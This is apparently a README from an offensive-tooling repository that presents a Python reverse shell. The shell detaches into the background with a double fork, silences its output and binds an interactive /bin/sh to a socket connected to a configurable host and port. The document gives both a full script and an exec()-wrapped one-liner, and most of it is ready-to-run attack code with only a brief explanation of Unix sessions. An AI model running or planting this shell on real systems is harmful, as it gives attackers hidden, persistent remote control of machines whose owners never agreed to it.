## Python Background Reverse Shell

This script will create a "daemonized" reverse shell in python  

This uses the "double fork" method to create a daemonized reverse shell  
Background:
- In Unix, every process belongs to a group, which in turn belongs to a session
- Here is the hierarchy: Session (SID) -> Process Group (PGID) -> Process (PID)  
- Every session can have one TTY associated with it. Only a session leader can take control of a TTY

So, after the first fork/parent kill, the process becomes the session leader, and could take control of a TTY  
We do not want this, so we run setsid() to create a new session and make ourselves the session leader of a new session, then kill the parent again, and now we are not the session leader, so cannot control a tty

```python
HOST = "127.0.0.1"
PORT = 9999

import socket,subprocess,os,sys

# If pid is greater than 0, we are in the parent process
pidrg = os.fork()
if pidrg > 0:
	sys.exit(0)

os.chdir("/")

# set sid makes us the session leader of a new session
os.setsid()

# umask changes the file permissions for all files created by this process
os.umask(0)

# If pid is greater than 0, we are in the parent process
drgpid = os.fork()
if drgpid > 0:
	sys.exit(0)

sys.stdout.flush()
sys.stderr.flush()

fdreg = open("/dev/null", "w")

sys.stdout = fdreg
sys.stderr = fdreg

sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sdregs.connect((HOST, PORT))

# duplicate sdregs.fileno() to 0, 1, 2
# sdregs.fileno() returns the sockets file descriptor
# the dup2s duplicate it onto the stdin, stdout, and stderr file descriptors
os.dup2(sdregs.fileno(), 0) # sys.stdin.fileno() = 0
os.dup2(sdregs.fileno(), 1) # sys.stout.fileno() = 1
os.dup2(sdregs.fileno(), 2) # sys.stderr.fileno() = 2

p=subprocess.call(["/bin/sh","-i"])
```

This shell can also be invoked with the following sh one liner:

```sh
python3 -c 'exec("""\nHOST="127.0.0.1"\nPORT=9999\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect((HOST,PORT))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
```